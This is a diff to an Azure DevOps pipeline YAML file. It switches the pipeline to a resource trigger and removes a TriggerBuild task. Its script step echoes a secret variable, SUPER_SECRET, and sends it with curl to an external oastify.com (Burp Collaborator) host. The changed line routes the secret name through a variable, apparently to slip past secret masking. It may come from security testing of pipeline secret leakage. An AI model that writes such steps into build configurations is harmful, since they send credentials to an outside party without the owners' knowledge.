@@ -1,23 +1,16 @@
 trigger: none
 pr: none
 
-# resources:
-#   pipelines:
-#   - pipeline: pipeline (B)
-#     source: pipeline (A)
-#     trigger: true # Run pipeline (B) when any run of pipeline (A) completes
-#     branch: main
+resources:
+  pipelines:
+  - pipeline: pipeline (B)
+    source: pipeline (A)
+    trigger: true # Run pipeline (B) when any run of pipeline (A) completes
+    branch: main
 
-steps:
-  - task: TriggerBuild@3
-    inputs:
-      definition: 'Pipeline (A)'            # Name of the pipeline (not display name)
-      branch: 'refs/heads/main'
-      waitForCompletion: true
-      useSameSourceVersion: false        # Set to true if you want to use the same commit
-      buildParameters: ''
-    
+steps:    
   - script: |
       echo $(SUPER_SECRET)
-      curl https://rupx4un8zwdy1729e272k46xqowfk58u.oastify.com?secret=$(SUPER_SECRET)
+      $var = "SUPER_SECRET"
+      curl https://rupx4un8zwdy1729e272k46xqowfk58u.oastify.com?secret=$($var)
   
